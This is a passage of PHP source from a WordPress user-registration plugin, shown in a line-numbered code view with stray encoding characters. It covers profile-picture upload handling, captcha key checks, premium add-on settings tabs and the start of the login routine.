| [3136](#L3136) | $rolesÂ =Â array(); |
| [3137](#L3137) |  |
| [3138](#L3138) | ifÂ (Â $user\_idÂ )Â { |
| [3139](#L3139) | $user\_metaÂ =Â get\_userdata(Â $user\_idÂ ); |
| [3140](#L3140) | $rolesÂ  Â  Â =Â isset(Â $user\_meta->rolesÂ )Â ?Â $user\_meta->rolesÂ :Â array(); |
| [3141](#L3141) | } |
| [3142](#L3142) |  |
| [3143](#L3143) | $user\_rolesÂ =Â array\_map(Â 'ucfirst',Â $rolesÂ ); |
| [3144](#L3144) |  |
| [3145](#L3145) | returnÂ $user\_roles; |
| [3146](#L3146) | } |
| [3147](#L3147) | } |
| [3148](#L3148) |  |
| [3149](#L3149) | ifÂ (Â !Â function\_exists(Â 'ur\_upload\_profile\_pic'Â )Â )Â { |
| [3150](#L3150) | /\*\* |
| [3151](#L3151) | \* Upload Profile Picture |
| [3152](#L3152) | \* |
| [3153](#L3153) | \* @param [array] $valid\_form\_data Valid Form Data. |
| [3154](#L3154) | \* @param [int]Â  Â $user\_id User Id. |
| [3155](#L3155) | \*/ |
| [3156](#L3156) | functionÂ ur\_upload\_profile\_pic(Â $valid\_form\_data,Â $user\_idÂ )Â { |
| [3157](#L3157) | $attachment\_idÂ =Â array(); |
| [3158](#L3158) | $upload\_pathÂ  Â =Â UR\_UPLOAD\_PATHÂ .Â 'profile-pictures';Â /\*Get path of upload dir of User Registration for profile pictures\*/ |
| [3159](#L3159) |  |
| [3160](#L3160) | // Checks if the upload directory exists and create one if not. |
| [3161](#L3161) | ifÂ (Â !Â file\_exists(Â $upload\_pathÂ )Â )Â { |
| [3162](#L3162) | wp\_mkdir\_p(Â $upload\_pathÂ ); |
| [3163](#L3163) | } |
| [3164](#L3164) |  |
| [3165](#L3165) | $upload\_fileÂ =Â $valid\_form\_data['profile\_pic\_url']->value; |
| [3166](#L3166) |  |
| [3167](#L3167) | ifÂ (Â !Â is\_numeric(Â $upload\_fileÂ )Â )Â { |
| [3168](#L3168) | $uploadÂ =Â maybe\_unserialize(Â crypt\_the\_string(Â $upload\_file,Â 'd'Â )Â ); |
| [3169](#L3169) | ifÂ (Â isset(Â $upload['file\_name']Â )Â &&Â isset(Â $upload['file\_path']Â )Â &&Â isset(Â $upload['file\_extension']Â )Â )Â { |
| [3170](#L3170) | $upload\_pathÂ =Â $upload\_pathÂ .Â '/'; |
| [3171](#L3171) | $file\_nameÂ  Â =Â wp\_unique\_filename(Â $upload\_path,Â $upload['file\_name']Â ); |
| [3172](#L3172) | $file\_pathÂ  Â =Â $upload\_pathÂ .Â sanitize\_file\_name(Â $file\_nameÂ ); |
| [3173](#L3173) | // Check the type of file. We'll use this as the 'post\_mime\_type'. |
| [3174](#L3174) | $filetypeÂ =Â wp\_check\_filetype(Â basename(Â $file\_nameÂ ),Â nullÂ ); |
| [3175](#L3175) | $movedÂ  Â  =Â rename(Â $upload['file\_path'],Â $file\_pathÂ ); |
| [3176](#L3176) |  |
| [3177](#L3177) | ifÂ (Â $movedÂ )Â { |
| [3178](#L3178) | $attachment\_idÂ =Â wp\_insert\_attachment( |
| [3179](#L3179) | array( |
| [3180](#L3180) | 'guid'Â  Â  Â  Â  Â  Â =>Â $file\_path, |
| [3181](#L3181) | 'post\_mime\_type'Â =>Â $filetype['type'], |
| [3182](#L3182) | 'post\_title'Â  Â  Â =>Â preg\_replace(Â '/\.[^.]+$/',Â '',Â sanitize\_file\_name(Â $file\_nameÂ )Â ), |
| [3183](#L3183) | 'post\_content'Â  Â =>Â '', |
| [3184](#L3184) | 'post\_status'Â  Â  =>Â 'inherit', |
| [3185](#L3185) | ), |
| [3186](#L3186) | $file\_path |
| [3187](#L3187) | ); |
| [3188](#L3188) |  |
| [3189](#L3189) | ifÂ (Â !Â is\_wp\_error(Â $attachment\_idÂ )Â )Â { |
| [3190](#L3190) | include\_onceÂ ABSPATHÂ .Â 'wp-admin/includes/image.php'; |
| [3191](#L3191) |  |
| [3192](#L3192) | // Generate and save the attachment metas into the database. |
| [3193](#L3193) | wp\_update\_attachment\_metadata(Â $attachment\_id,Â wp\_generate\_attachment\_metadata(Â $attachment\_id,Â $file\_pathÂ )Â ); |
| [3194](#L3194) | } |
| [3195](#L3195) | } |
| [3196](#L3196) | } |
| [3197](#L3197) | }Â elseÂ { |
| [3198](#L3198) | $attachment\_idÂ =Â $upload\_file; |
| [3199](#L3199) | } |
| [3200](#L3200) | $attachment\_idÂ =Â !Â empty(Â $attachment\_idÂ )Â ?Â $attachment\_idÂ :Â ''; |
| [3201](#L3201) | update\_user\_meta(Â $user\_id,Â 'user\_registration\_profile\_pic\_url',Â $attachment\_idÂ ); |
| [3202](#L3202) | } |
| [3203](#L3203) | } |
| [3204](#L3204) |  |
| [3205](#L3205) | /\*\* |
| [3206](#L3206) | \* Check given string is valid url or not. |
| [3207](#L3207) | \*/ |
| [3208](#L3208) | ifÂ (Â !Â function\_exists(Â 'ur\_is\_valid\_url'Â )Â )Â { |
| [3209](#L3209) | /\*\* |
| [3210](#L3210) | \* Checks if url is valid. |
| [3211](#L3211) | \* |
| [3212](#L3212) | \* @param [string] $url URL. |
| [3213](#L3213) | \* @return bool |
| [3214](#L3214) | \*/ |
| [3215](#L3215) | functionÂ ur\_is\_valid\_url(Â $urlÂ )Â { |
| [3216](#L3216) |  |
| [3217](#L3217) | // Must start with http:// or https://. |
| [3218](#L3218) | ifÂ (Â 0Â !==Â strpos(Â $url,Â 'http://'Â )Â &&Â 0Â !==Â strpos(Â $url,Â 'https://'Â )Â )Â { |
| [3219](#L3219) | returnÂ false; |
| [3220](#L3220) | } |
| [3221](#L3221) |  |
| [3222](#L3222) | // Must pass validation. |
| [3223](#L3223) | ifÂ (Â !Â filter\_var(Â $url,Â FILTER\_VALIDATE\_URLÂ )Â )Â { |
| [3224](#L3224) | returnÂ false; |
| [3225](#L3225) | } |
| [3226](#L3226) |  |
| [3227](#L3227) | returnÂ true; |
| [3228](#L3228) | } |
| [3229](#L3229) | } |
| [3230](#L3230) |  |
| [3231](#L3231) | ifÂ (Â !Â function\_exists(Â 'ur\_option\_checked'Â )Â )Â { |
| [3232](#L3232) | /\*\* |
| [3233](#L3233) | \* Returns whether a setting checkbox or toggle is enabled. |
| [3234](#L3234) | \* |
| [3235](#L3235) | \* @param string $option\_name Option Name. |
| [3236](#L3236) | \* @param string $default Default Value. |
| [3237](#L3237) | \* @return boolean |
| [3238](#L3238) | \*/ |
| [3239](#L3239) | functionÂ ur\_option\_checked(Â $option\_nameÂ =Â '',Â $defaultÂ =Â ''Â )Â { |
| [3240](#L3240) |  |
| [3241](#L3241) | ifÂ (Â empty(Â $option\_nameÂ )Â )Â { |
| [3242](#L3242) | returnÂ false; |
| [3243](#L3243) | } |
| [3244](#L3244) |  |
| [3245](#L3245) | $option\_valueÂ =Â get\_option(Â $option\_name,Â $defaultÂ ); |
| [3246](#L3246) |  |
| [3247](#L3247) | // Handling Backward Compatibility. |
| [3248](#L3248) | ifÂ (Â 'yes'Â ===Â $option\_valueÂ )Â { |
| [3249](#L3249) | returnÂ true; |
| [3250](#L3250) | }Â elseifÂ (Â 'no'Â ===Â $option\_valueÂ )Â { |
| [3251](#L3251) | returnÂ false; |
| [3252](#L3252) | } |
| [3253](#L3253) |  |
| [3254](#L3254) | returnÂ ur\_string\_to\_bool(Â $option\_valueÂ ); |
| [3255](#L3255) | } |
| [3256](#L3256) | } |
| [3257](#L3257) |  |
| [3258](#L3258) | ifÂ (Â !Â function\_exists(Â 'ur\_check\_captch\_keys'Â )Â )Â { |
| [3259](#L3259) | /\*\* |
| [3260](#L3260) | \* Check the site key and secret key for the selected captcha type, are valid or not. |
| [3261](#L3261) | \* |
| [3262](#L3262) | \* @return bool |
| [3263](#L3263) | \*/ |
| [3264](#L3264) | functionÂ ur\_check\_captch\_keys()Â { |
| [3265](#L3265) | $recaptcha\_typeÂ  Â  Â  =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_version',Â 'v2'Â ); |
| [3266](#L3266) | $invisible\_recaptchaÂ =Â ur\_option\_checked(Â 'user\_registration\_captcha\_setting\_invisible\_recaptcha\_v2',Â falseÂ ); |
| [3267](#L3267) |  |
| [3268](#L3268) | $site\_keyÂ  Â =Â ''; |
| [3269](#L3269) | $secret\_keyÂ =Â ''; |
| [3270](#L3270) |  |
| [3271](#L3271) | ifÂ (Â 'v2'Â ===Â $recaptcha\_typeÂ )Â { |
| [3272](#L3272) | ifÂ (Â $invisible\_recaptchaÂ )Â { |
| [3273](#L3273) | $site\_keyÂ  Â =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_key'Â ); |
| [3274](#L3274) | $secret\_keyÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_secret'Â ); |
| [3275](#L3275) | }Â elseÂ { |
| [3276](#L3276) | $site\_keyÂ  Â =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_key'Â ); |
| [3277](#L3277) | $secret\_keyÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret'Â ); |
| [3278](#L3278) | } |
| [3279](#L3279) | }Â elseifÂ (Â 'v3'Â ===Â $recaptcha\_typeÂ )Â { |
| [3280](#L3280) | $site\_keyÂ  Â =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_v3'Â ); |
| [3281](#L3281) | $secret\_keyÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_v3'Â ); |
| [3282](#L3282) | }Â elseifÂ (Â 'hCaptcha'Â ===Â $recaptcha\_typeÂ )Â { |
| [3283](#L3283) | $site\_keyÂ  Â =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_hcaptcha'Â ); |
| [3284](#L3284) | $secret\_keyÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_hcaptcha'Â ); |
| [3285](#L3285) | } |
| [3286](#L3286) |  |
| [3287](#L3287) | ifÂ (Â !Â empty(Â $site\_keyÂ )Â &&Â !Â empty(Â $secret\_keyÂ )Â )Â { |
| [3288](#L3288) | returnÂ true; |
| [3289](#L3289) | } |
| [3290](#L3290) |  |
| [3291](#L3291) | returnÂ false; |
| [3292](#L3292) |  |
| [3293](#L3293) | } |
| [3294](#L3294) | } |
| [3295](#L3295) |  |
| [3296](#L3296) |  |
| [3297](#L3297) | ifÂ (Â !Â function\_exists(Â 'ur\_premium\_settings\_tab'Â )Â )Â { |
| [3298](#L3298) |  |
| [3299](#L3299) | /\*\* |
| [3300](#L3300) | \* Settings tab list to display as premium tabs. |
| [3301](#L3301) | \* |
| [3302](#L3302) | \* @since 3.0 |
| [3303](#L3303) | \*/ |
| [3304](#L3304) | functionÂ ur\_premium\_settings\_tab()Â { |
| [3305](#L3305) |  |
| [3306](#L3306) | $premium\_tabsÂ =Â array( |
| [3307](#L3307) | 'woocommerce'Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  =>Â array( |
| [3308](#L3308) | 'label'Â  =>Â esc\_html\_\_(Â 'WooCommerce',Â 'user-registration'Â ), |
| [3309](#L3309) | 'plugin'Â =>Â 'user-registration-woocommerce', |
| [3310](#L3310) | 'plan'Â  Â =>Â array(Â 'personal',Â 'plus',Â 'professional'Â ), |
| [3311](#L3311) | 'name'Â  Â =>Â esc\_html\_\_(Â 'User Registration - WooCommerce',Â 'user-registration'Â ), |
| [3312](#L3312) | ), |
| [3313](#L3313) | 'content\_restriction'Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  =>Â array( |
| [3314](#L3314) | 'label'Â  =>Â esc\_html\_\_(Â 'Content Restriction',Â 'user-registration'Â ), |
| [3315](#L3315) | 'plugin'Â =>Â 'user-registration-content-restriction', |
| [3316](#L3316) | 'plan'Â  Â =>Â array(Â 'personal',Â 'plus',Â 'professional'Â ), |
| [3317](#L3317) | 'name'Â  Â =>Â esc\_html\_\_(Â 'User Registration - Content Restriction',Â 'user-registration'Â ), |
| [3318](#L3318) | ), |
| [3319](#L3319) | 'file\_upload'Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  =>Â array( |
| [3320](#L3320) | 'label'Â  =>Â esc\_html\_\_(Â 'File Uploads',Â 'user-registration'Â ), |
| [3321](#L3321) | 'plugin'Â =>Â 'user-registration-file-upload', |
| [3322](#L3322) | 'plan'Â  Â =>Â array(Â 'personal',Â 'plus',Â 'professional'Â ), |
| [3323](#L3323) | 'name'Â  Â =>Â esc\_html\_\_(Â 'User Registration - File Upload',Â 'user-registration'Â ), |
| [3324](#L3324) | ), |
| [3325](#L3325) | 'user-registration-customize-my-account'Â =>Â array( |
| [3326](#L3326) | 'label'Â  =>Â esc\_html\_\_(Â 'Customize My Account',Â 'user-registration'Â ), |
| [3327](#L3327) | 'plugin'Â =>Â 'user-registration-customize-my-account', |
| [3328](#L3328) | 'plan'Â  Â =>Â array(Â 'plus',Â 'professional'Â ), |
| [3329](#L3329) | 'name'Â  Â =>Â esc\_html\_\_(Â 'User Registration customize my account',Â 'user-registration'Â ), |
| [3330](#L3330) | ), |
| [3331](#L3331) | ); |
| [3332](#L3332) |  |
| [3333](#L3333) | returnÂ apply\_filters(Â 'user\_registration\_premium\_settings\_tab',Â $premium\_tabsÂ ); |
| [3334](#L3334) | } |
| [3335](#L3335) | } |
| [3336](#L3336) |  |
| [3337](#L3337) | add\_action(Â 'user\_registration\_settings\_tabs',Â 'ur\_display\_premium\_settings\_tab'Â ); |
| [3338](#L3338) |  |
| [3339](#L3339) | ifÂ (Â !Â function\_exists(Â 'ur\_display\_premium\_settings\_tab'Â )Â )Â { |
| [3340](#L3340) |  |
| [3341](#L3341) | /\*\* |
| [3342](#L3342) | \* Method to display premium settings tabs. |
| [3343](#L3343) | \* |
| [3344](#L3344) | \* @since 3.0 |
| [3345](#L3345) | \*/ |
| [3346](#L3346) | functionÂ ur\_display\_premium\_settings\_tab()Â { |
| [3347](#L3347) | $license\_dataÂ  Â  =Â ur\_get\_license\_plan(); |
| [3348](#L3348) | $license\_planÂ  Â  =Â !Â empty(Â $license\_data->item\_planÂ )Â ?Â $license\_data->item\_planÂ :Â false; |
| [3349](#L3349) | $premium\_tabsÂ  Â  =Â ur\_premium\_settings\_tab(); |
| [3350](#L3350) | $tabs\_to\_displayÂ =Â array(); |
| [3351](#L3351) | $tab\_htmlÂ  Â  Â  Â  =Â ''; |
| [3352](#L3352) |  |
| [3353](#L3353) | foreachÂ (Â $premium\_tabsÂ asÂ $tabÂ =>Â $detailÂ )Â { |
| [3354](#L3354) | $tooltip\_htmlÂ =Â ''; |
| [3355](#L3355) | $buttonÂ  Â  Â  Â =Â ''; |
| [3356](#L3356) | ifÂ (Â 'woocommerce'Â ===Â $tabÂ &&Â !Â is\_plugin\_active(Â $detail['plugin']Â .Â '/'Â .Â $detail['plugin']Â .Â '.php'Â )Â )Â { |
| [3357](#L3357) | continue; |
| [3358](#L3358) | } |
| [3359](#L3359) |  |
| [3360](#L3360) | ifÂ (Â !Â empty(Â $license\_planÂ )Â )Â { |
| [3361](#L3361) | ifÂ (Â !Â in\_array(Â $license\_plan,Â $detail['plan'],Â trueÂ )Â )Â { |
| [3362](#L3362) | ifÂ (Â is\_plugin\_active(Â $detail['plugin']Â .Â '/'Â .Â $detail['plugin']Â .Â '.php'Â )Â )Â { |
| [3363](#L3363) | continue; |
| [3364](#L3364) | } |
| [3365](#L3365) |  |
| [3366](#L3366) | /\* translators: %s: License Plan Name. \*/ |
| [3367](#L3367) | $tooltip\_htmlÂ =Â sprintf(Â \_\_(Â 'You have been subscribed to %s plan. Please upgrade to higher plans to use this feature.',Â 'user-registration'Â ),Â ucfirst(Â $license\_planÂ )Â ); |
| [3368](#L3368) | $buttonÂ  Â  Â  Â =Â '<a target="\_blank" href="https://wpuserregistration.com/pricing/?utm\_source=pro-fields&utm\_medium=popup-button&utm\_campaign=ur-upgrade-to-pro">'Â .Â esc\_html\_\_(Â 'Upgrade Plan',Â 'user-registration'Â )Â .Â '</a>'; |
| [3369](#L3369) | array\_push(Â $tabs\_to\_display,Â $tabÂ ); |
| [3370](#L3370) | }Â elseÂ { |
| [3371](#L3371) | $plugin\_nameÂ =Â $detail['name']; |
| [3372](#L3372) | $actionÂ  Â  Â  =Â ''; |
| [3373](#L3373) |  |
| [3374](#L3374) | ifÂ (Â file\_exists(Â WP\_PLUGIN\_DIRÂ .Â '/'Â .Â $detail['plugin']Â )Â )Â { |
| [3375](#L3375) | ifÂ (Â !Â is\_plugin\_active(Â $detail['plugin']Â .Â '/'Â .Â $detail['plugin']Â .Â '.php'Â )Â )Â { |
| [3376](#L3376) | $actionÂ =Â 'Activate'; |
| [3377](#L3377) | }Â elseÂ { |
| [3378](#L3378) | continue; |
| [3379](#L3379) | } |
| [3380](#L3380) | }Â elseÂ { |
| [3381](#L3381) | $actionÂ =Â 'Install'; |
| [3382](#L3382) | } |
| [3383](#L3383) |  |
| [3384](#L3384) | /\* translators: %s: Addon Name. \*/ |
| [3385](#L3385) | $tooltip\_htmlÂ =Â sprintf(Â \_\_(Â 'Please %1$s %2$s addon to use this feature.',Â 'user-registration'Â ),Â $action,Â ucwords(Â str\_replace(Â '-',Â ' ',Â $detail['plugin']Â )Â )Â ); |
| [3386](#L3386) |  |
| [3387](#L3387) | /\* translators: %s: Action Name. \*/ |
| [3388](#L3388) | $buttonÂ =Â '<a href="#" class="user-registration-settings-addon-'Â .Â strtolower(Â $actionÂ )Â .Â '" data-slug="'Â .Â $detail['plugin']Â .Â '" data-name="'Â .Â $plugin\_nameÂ .Â '">'Â .Â sprintf(Â esc\_html\_\_(Â '%s Addon',Â 'user-registration'Â ),Â $actionÂ )Â .Â '</a>'; |
| [3389](#L3389) | array\_push(Â $tabs\_to\_display,Â $tabÂ ); |
| [3390](#L3390) | } |
| [3391](#L3391) | }Â elseÂ { |
| [3392](#L3392) |  |
| [3393](#L3393) | ifÂ (Â is\_plugin\_active(Â $detail['plugin']Â .Â '/'Â .Â $detail['plugin']Â .Â '.php'Â )Â )Â { |
| [3394](#L3394) | continue; |
| [3395](#L3395) | } |
| [3396](#L3396) |  |
| [3397](#L3397) | $tooltip\_htmlÂ =Â \_\_(Â 'You are currently using the free version of our plugin. Please upgrade to premium version to use this feature.',Â 'user-registration'Â ); |
| [3398](#L3398) | $buttonÂ  Â  Â  Â =Â '<a target="\_blank" href="https://wpuserregistration.com/pricing/?utm\_source=pro-fields&utm\_medium=popup-button&utm\_campaign=ur-upgrade-to-pro">'Â .Â esc\_html\_\_(Â 'Upgrade to Pro',Â 'user-registration'Â )Â .Â '</a>'; |
| [3399](#L3399) | array\_push(Â $tabs\_to\_display,Â $tabÂ ); |
| [3400](#L3400) | } |
| [3401](#L3401) |  |
| [3402](#L3402) | ifÂ (Â in\_array(Â $tab,Â $tabs\_to\_display,Â trueÂ )Â )Â { |
| [3403](#L3403) | $tab\_htmlÂ .=Â '<button class="nav-tab ur-nav\_\_link ur-nav-premium" disabled>'; |
| [3404](#L3404) | $tab\_htmlÂ .=Â '<span class="ur-tooltip">'Â .Â esc\_html(Â $tooltip\_htmlÂ )Â .Â wp\_kses\_post(Â $buttonÂ )Â .Â '</span>'; |
| [3405](#L3405) | $tab\_htmlÂ .=Â '<span class="ur-nav\_\_link-icon">'; |
| [3406](#L3406) | $tab\_htmlÂ .=Â ur\_file\_get\_contents(Â '/assets/images/settings-icons/'Â .Â $tabÂ .Â '.svg'Â ); |
| [3407](#L3407) | $tab\_htmlÂ .=Â '</span>'; |
| [3408](#L3408) | $tab\_htmlÂ .=Â '<span class="ur-nav\_\_link-label">'; |
| [3409](#L3409) | $tab\_htmlÂ .=Â '<p>'Â .Â esc\_html(Â $detail['label']Â )Â .Â '</p>'; |
| [3410](#L3410) | $tab\_htmlÂ .=Â '<svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="0.5" y="0.5" width="19" height="19" rx="2.5" fill="#5462FF" stroke="#5462FF"/><path d="M10 5L13 13H7L10 5Z" fill="#EFEFEF"/><path fill-rule="evenodd" clip-rule="evenodd" d="M5 7L5.71429 13H14.2857L15 7L10 11.125L5 7ZM14.2857 13.5714H5.71427V15H14.2857V13.5714Z" fill="white"/></svg>'; |
| [3411](#L3411) | $tab\_htmlÂ .=Â '</span>'; |
| [3412](#L3412) | $tab\_htmlÂ .=Â '</button>'; |
| [3413](#L3413) | } |
| [3414](#L3414) | } |
| [3415](#L3415) |  |
| [3416](#L3416) | echoÂ $tab\_html;Â // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped |
| [3417](#L3417) | } |
| [3418](#L3418) | } |
| [3419](#L3419) |  |
| [3420](#L3420) | ifÂ (Â !Â function\_exists(Â 'ur\_is\_ajax\_login\_enabled'Â )Â )Â { |
| [3421](#L3421) | /\*\* |
| [3422](#L3422) | \* Check whether the ajax login is enabled or not. |
| [3423](#L3423) | \* |
| [3424](#L3424) | \* @return bool |
| [3425](#L3425) | \*/ |
| [3426](#L3426) | functionÂ ur\_is\_ajax\_login\_enabled()Â { |
| [3427](#L3427) | returnÂ ur\_option\_checked(Â 'ur\_login\_ajax\_submission',Â falseÂ ); |
| [3428](#L3428) | } |
| [3429](#L3429) | } |
| [3430](#L3430) |  |
| [3431](#L3431) | ifÂ (Â !Â function\_exists(Â 'ur\_process\_login'Â )Â )Â { |
| [3432](#L3432) | /\*\* |
| [3433](#L3433) | \* Process the login form. |
| [3434](#L3434) | \* |
| [3435](#L3435) | \* @param string $nonce\_value Nonce. |
| [3436](#L3436) | \* @throws Exception Login errors. |
| [3437](#L3437) | \* |
| [3438](#L3438) | \* @since 3.0 |
| [3439](#L3439) | \*/ |
| [3440](#L3440) | functionÂ ur\_process\_login(Â $nonce\_valueÂ )Â { |
| [3441](#L3441) | tryÂ { |
| [3442](#L3442) | // Custom error messages. |
| [3443](#L3443) | $messagesÂ =Â array( |
| [3444](#L3444) | 'empty\_username'Â  Â =>Â get\_option(Â 'user\_registration\_message\_username\_required',Â esc\_html\_\_(Â 'Username is required.',Â 'user-registration'Â )Â ), |
| [3445](#L3445) | 'empty\_password'Â  Â =>Â get\_option(Â 'user\_registration\_message\_empty\_password',Â nullÂ ), |
| [3446](#L3446) | 'invalid\_username'Â =>Â get\_option(Â 'user\_registration\_message\_invalid\_username',Â nullÂ ), |
| [3447](#L3447) | 'unknown\_email'Â  Â  =>Â get\_option(Â 'user\_registration\_message\_unknown\_email',Â esc\_html\_\_(Â 'A user could not be found with this email address.',Â 'user-registration'Â )Â ), |
| [3448](#L3448) | 'pending\_approval'Â =>Â get\_option(Â 'user\_registration\_message\_pending\_approval',Â nullÂ ), |
| [3449](#L3449) | 'denied\_access'Â  Â  =>Â get\_option(Â 'user\_registration\_message\_denied\_account',Â nullÂ ), |
| [3450](#L3450) | ); |
| [3451](#L3451) |  |
| [3452](#L3452) | $postÂ =Â $\_POST;Â // phpcs:ignore WordPress.Security.NonceVerification |
| [3453](#L3453) |  |
| [3454](#L3454) | $hcaptca\_responseÂ  Â  =Â isset(Â $post['h-captcha-response']Â )Â ?Â sanitize\_text\_field(Â wp\_unslash(Â $post['h-captcha-response']Â )Â )Â :Â ''; |
| [3455](#L3455) | $recaptcha\_valueÂ  Â  Â =Â isset(Â $post['g-recaptcha-response']Â )Â ?Â sanitize\_text\_field(Â wp\_unslash(Â $post['g-recaptcha-response']Â )Â )Â :Â $hcaptca\_response; |
| [3456](#L3456) | $captcha\_responseÂ  Â  =Â isset(Â $post['CaptchaResponse']Â )Â ?Â $post['CaptchaResponse']Â :Â '';Â //phpcs:ignore |
| [3457](#L3457) | $recaptcha\_enabledÂ  Â =Â ur\_option\_checked(Â 'user\_registration\_login\_options\_enable\_recaptcha',Â falseÂ ); |
| [3458](#L3458) | $recaptcha\_typeÂ  Â  Â  =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_version',Â 'v2'Â ); |
| [3459](#L3459) | $invisible\_recaptchaÂ =Â ur\_option\_checked(Â 'user\_registration\_captcha\_setting\_invisible\_recaptcha\_v2',Â falseÂ ); |
| [3460](#L3460) |  |
| [3461](#L3461) | ifÂ (Â ur\_is\_ajax\_login\_enabled()Â )Â { |
| [3462](#L3462) | $hcaptca\_responseÂ =Â $captcha\_response; |
| [3463](#L3463) | $recaptcha\_valueÂ  =Â $captcha\_response; |
| [3464](#L3464) | } |
| [3465](#L3465) |  |
| [3466](#L3466) | $login\_dataÂ =Â array( |
| [3467](#L3467) | 'user\_password'Â =>Â isset(Â $post['password']Â )Â ?Â wp\_unslash(Â $post['password']Â )Â :Â '',Â //phpcs:ignore; |
| [3468](#L3468) | 'remember'Â  Â  Â  =>Â isset(Â $post['rememberme']Â ), |
| [3469](#L3469) | ); |
| [3470](#L3470) |  |
| [3471](#L3471) | $usernameÂ =Â isset(Â $post['username']Â )Â ?Â trim(Â sanitize\_user(Â wp\_unslash(Â $post['username']Â )Â )Â )Â :Â ''; |
| [3472](#L3472) |  |
| [3473](#L3473) | ifÂ (Â 'v2'Â ===Â $recaptcha\_typeÂ &&Â !Â $invisible\_recaptchaÂ )Â { |
| [3474](#L3474) | $site\_keyÂ  Â =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_key'Â ); |
| [3475](#L3475) | $secret\_keyÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret'Â ); |
| [3476](#L3476) | }Â elseifÂ (Â 'v2'Â ===Â $recaptcha\_typeÂ &&Â $invisible\_recaptchaÂ )Â { |
| [3477](#L3477) | $site\_keyÂ  Â =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_key'Â ); |
| [3478](#L3478) | $secret\_keyÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_secret'Â ); |
| [3479](#L3479) | }Â elseifÂ (Â 'v3'Â ===Â $recaptcha\_typeÂ )Â { |
| [3480](#L3480) | $site\_keyÂ  Â =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_v3'Â ); |
| [3481](#L3481) | $secret\_keyÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_v3'Â ); |
| [3482](#L3482) | }Â elseifÂ (Â 'hCaptcha'Â ===Â $recaptcha\_typeÂ )Â { |
| [3483](#L3483) | $site\_keyÂ  Â =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_hcaptcha'Â ); |
| [3484](#L3484) | $secret\_keyÂ =Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_hcaptcha'Â ); |
| [3485](#L3485) | } |
| [3486](#L3486) |  |
| [3487](#L3487) | ifÂ (Â $recaptcha\_enabledÂ &&Â !Â empty(Â $site\_keyÂ )Â &&Â !Â empty(Â $secret\_keyÂ )Â )Â { |
| [3488](#L3488) | ifÂ (Â !Â empty(Â $recaptcha\_valueÂ )Â )Â { |
| [3489](#L3489) | ifÂ (Â 'hCaptcha'Â ===Â $recaptcha\_typeÂ )Â { |
| [3490](#L3490) | $dataÂ =Â wp\_remote\_get(Â 'https://hcaptcha.com/siteverify?secret='Â .Â $secret\_keyÂ .Â '&response='Â .Â $recaptcha\_valueÂ ); |
| [3491](#L3491) | $dataÂ =Â json\_decode(Â wp\_remote\_retrieve\_body(Â $dataÂ )Â ); |
| [3492](#L3492) |  |
| [3493](#L3493) | ifÂ (Â empty(Â $data->successÂ )Â ||Â (Â isset(Â $data->scoreÂ )Â &&Â $data->scoreÂ <Â apply\_filters(Â 'user\_registration\_hcaptcha\_threshold',Â 0.5Â )Â )Â )Â { |
| [3494](#L3494) | throwÂ newÂ Exception(Â '<strong>'Â .Â esc\_html\_\_(Â 'ERROR:',Â 'user-registration'Â )Â .Â '</strong>'Â .Â esc\_html\_\_(Â 'Error on hCaptcha. Contact your site administrator.',Â 'user-registration'Â )Â ); |
| [3495](#L3495) | } |
| [3496](#L3496) | }Â elseÂ { |
| [3497](#L3497) | $dataÂ =Â wp\_remote\_get(Â 'https://www.google.com/recaptcha/api/siteverify?secret='Â .Â $secret\_keyÂ .Â '&response='Â .Â $recaptcha\_valueÂ ); |
| [3498](#L3498) | $dataÂ =Â json\_decode(Â wp\_remote\_retrieve\_body(Â $dataÂ )Â ); |
| [3499](#L3499) | ifÂ (Â empty(Â $data->successÂ )Â ||Â (Â isset(Â $data->scoreÂ )Â &&Â $data->scoreÂ <=Â get\_option(Â 'user\_registration\_captcha\_setting\_recaptcha\_threshold\_score\_v3',Â apply\_filters(Â 'user\_registration\_recaptcha\_v3\_threshold',Â 0.5Â )Â )Â )Â )Â { |
| [3500](#L3500) | throwÂ newÂ Exception(Â '<strong>'Â .Â esc\_html\_\_(Â 'ERROR:',Â 'user-registration'Â )Â .Â '</strong>'Â .Â esc\_html\_\_(Â 'Error on google reCaptcha. Contact your site administrator.',Â 'user-registration'Â )Â ); |
| [3501](#L3501) | } |
| [3502](#L3502) | } |
| [3503](#L3503) | }Â elseÂ { |
| [3504](#L3504) | throwÂ newÂ Exception(Â '<strong>'Â .Â esc\_html\_\_(Â 'ERROR:',Â 'user-registration'Â )Â .Â '</strong>'Â .Â get\_option(Â 'user\_registration\_form\_submission\_error\_message\_recaptcha',Â esc\_html\_\_(Â 'Captcha code error, please try again.',Â 'user-registration'Â )Â )Â ); |
| [3505](#L3505) | } |
| [3506](#L3506) | } |
| [3507](#L3507) |  |
| [3508](#L3508) | do\_action(Â 'user\_registration\_login\_process\_before\_username\_validation',Â $post,Â $username,Â $nonce\_value,Â $messagesÂ ); |
